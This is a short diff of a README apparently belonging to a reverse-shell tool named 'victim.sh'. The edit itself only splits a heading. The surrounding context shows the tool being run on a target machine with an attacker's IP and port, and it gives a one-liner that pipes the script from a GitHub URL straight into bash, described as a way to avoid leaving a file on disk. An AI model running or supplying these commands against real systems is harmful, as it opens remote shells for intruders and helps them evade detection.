@@ -29,7 +29,8 @@ On the target machine, provide both the attacker's IP and the listening port.
 ./victim.sh <attacker_ip> <port>
 ```
 ------------------------------
-## 💡 Quick Tips## Execution via Remote Pipe
+## 💡 Quick Tips
+## Execution via Remote Pipe
 If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:
 ```bash
 curl -s https://raw.githubusercontent.com/x86david/kali_interactive_tty/refs/heads/master/victim.sh | bash -s -- <attacker_ip> <port>
